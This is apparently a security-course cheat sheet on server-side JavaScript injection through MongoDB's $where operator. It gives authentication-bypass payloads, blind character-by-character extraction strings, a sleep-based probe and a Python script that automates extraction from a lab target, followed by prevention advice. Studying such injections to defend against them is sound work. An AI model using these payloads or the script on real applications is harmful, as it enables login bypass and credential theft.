# Server-Side JavaScript Injection

Server-Side JavaScript Injection (SSJI) is a unique type of NoSQL injection where an attacker can execute arbitrary JavaScript in the database context using the `$where` operator.

## Theory

MongoDB's `$where` operator allows JavaScript expressions to be evaluated as query conditions. When user input is unsanitized, this can lead to JavaScript injection.

### Vulnerable Code Example

```javascript
db.users.find({
    $where: 'this.username === "' + req.body['username'] + '" && this.password === "' + req.body['password'] + '"'
});
```

## Authentication Bypass

### Basic Bypass Payload

Use JavaScript logical operators to always return `true`:

```javascript
// Payload: " || true || ""=="
db.users.find({
    $where: 'this.username === "" || true || ""=="" && this.password === "<password>"'
});
```

### URL-Encoded Payload

```
username=%22+%7C%7C+true+%7C%7C+%22%22%3D%3D%22&password=anything
```

## Blind Data Extraction

### Character-by-Character Extraction

Use JavaScript `match()` function with regex patterns:

**Test first character:**
```javascript
// Payload: " || (this.username.match('^H.*')) || ""=="
db.users.find({
    $where: 'this.username === "" || (this.username.match("^H.*")) || ""=="" && this.password === "<password>"'
});
```

**Continue extraction:**
```javascript
// Second character: " || (this.username.match('^HT.*')) || ""=="
// Third character: " || (this.username.match('^HTB.*')) || ""=="
// And so on...
```

### Complete Extraction Process

1. **Verify injection works:**
   ```javascript
   " || (this.username.match('^.*')) || ""=="
   ```

2. **Extract first character:**
   ```javascript
   " || (this.username.match('^a.*')) || ""=="  // No match
   " || (this.username.match('^b.*')) || ""=="  // No match
   " || (this.username.match('^H.*')) || ""=="  // Match!
   ```

3. **Continue for each position:**
   ```javascript
   " || (this.username.match('^HT.*')) || ""=="
   " || (this.username.match('^HTB.*')) || ""=="
   " || (this.username.match('^HTB{.*')) || ""=="
   ```

## Advanced JavaScript Payloads

### Multiple Field Extraction

```javascript
// Extract both username and password
" || (this.username.match('^H.*') && this.password.match('^a.*')) || ""=="
```

### Conditional Logic

```javascript
// Extract based on conditions
" || (this.username.length > 5 && this.username.match('^HTB.*')) || ""=="
```

### Function Calls

```javascript
// Use JavaScript functions
" || (this.username.indexOf('HTB') === 0) || ""=="
" || (this.username.startsWith('HTB')) || ""=="
```

## Automation Script

```python
#!/usr/bin/env python3

import requests
from urllib.parse import quote_plus

def oracle(r):
    response = requests.post("http://STMIP:STMPO/", headers = {"Content-Type": "application/x-www-form-urlencoded"}, data = f"""username={(quote_plus('" || (' + r + ') || ""=="'))}&password=test""")
    return "Logged in as" in response.text

username = "HTB{"
i = 4
while username[-1] != "}":
    for character in range(32, 127):
        if oracle(f'this.username.startsWith("HTB{{") && this.username.charCodeAt({i}) == {character}'):
            username += chr(character)
            break
    i += 1

assert(oracle(f'this.username == `{username}`') == True)
print(f"Username: {username}")
```

## Common JavaScript Operators

### Logical Operators
- `||` (OR) - Always true if one side is true
- `&&` (AND) - Both sides must be true
- `!` (NOT) - Negation

### Comparison Operators
- `===` (Strict equality)
- `!==` (Strict inequality)
- `==` (Loose equality)
- `!=` (Loose inequality)

### String Methods
- `match()` - Regex matching
- `indexOf()` - Find substring position
- `startsWith()` - Check prefix
- `endsWith()` - Check suffix
- `length` - String length

## Detection Methods

### Error-Based Detection

```javascript
// Cause syntax error
" || (this.username.match('^.*')) || ""=="
```

### Time-Based Detection

```javascript
// Sleep function (if available)
" || (sleep(5000)) || ""=="
```

### Boolean-Based Detection

```javascript
// True/false responses
" || true || ""=="  // Should always work
" || false || ""==" // Should never work
```

## Prevention

### Input Validation

```javascript
// Validate input before using in $where
function validateInput(input) {
    if (typeof input !== 'string') return false;
    if (input.includes('"') || input.includes("'")) return false;
    if (input.includes('||') || input.includes('&&')) return false;
    return true;
}
```

### Alternative Queries

```javascript
// Use standard MongoDB operators instead of $where
db.users.find({
    username: req.body.username,
    password: req.body.password
});
```

### Parameterized Queries

```javascript
// Use MongoDB driver's parameterized queries
const query = { username: username, password: password };
db.users.find(query);
```

## Key Points

- **Unique to NoSQL**: JavaScript injection is specific to MongoDB's `$where` operator
- **Flexible payloads**: Can use any valid JavaScript expressions
- **Multiple attack vectors**: Authentication bypass, data extraction, information disclosure
- **Automation friendly**: Easy to script character-by-character extraction
- **Detection methods**: Error-based, time-based, boolean-based

## Common Vulnerable Patterns

- User input directly concatenated into `$where` expressions
- Lack of input validation on JavaScript operators
- Using `$where` when standard operators would suffice
- Missing output encoding in error messages
